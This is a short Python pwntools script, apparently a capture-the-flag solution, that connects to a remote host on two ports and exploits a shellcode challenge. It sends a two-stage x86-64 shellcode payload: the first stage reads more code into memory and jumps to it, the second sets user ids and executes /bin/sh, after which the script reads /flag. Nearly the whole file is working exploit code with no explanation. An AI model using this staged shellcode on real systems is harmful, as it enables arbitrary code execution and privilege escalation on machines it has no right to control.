from pwn import asm, context, process, remote


context.arch = "amd64"


def send_shellcode(p: process | remote) -> None:
    p.sendline(b"/challenge/shellcode")

    payload1 = """
        lea rsi, [rax + 0x10]
        xor eax, eax
        xor edi, edi
        push 0x40
        pop rdx
        syscall

        jmp rsi
    """

    p.sendline(asm(payload1))

    payload2 = """
        xor rax, rax
        mov al, 107
        syscall

        mov rdi, rax
        mov rsi, rax
        mov rdx, rax
        mov rax, 117
        syscall

        xor rax, rax
        mov rbx, 0x0068732f6e69622f
        push rbx
        mov rdi, rsp
        push rax
        push rdi
        mov rsi, rsp
        mov al, 59
        xor rdx, rdx
        syscall
    """

    p.sendline(asm(payload2))

    p.sendline(b"cat /flag")
    p.sendline(b"exit")

    p.interactive()


def main() -> None:
    for port in (32_210, 32_178):
        p = remote("10.212.173.64", port)

        send_shellcode(p)


if __name__ == "__main__":
    main()
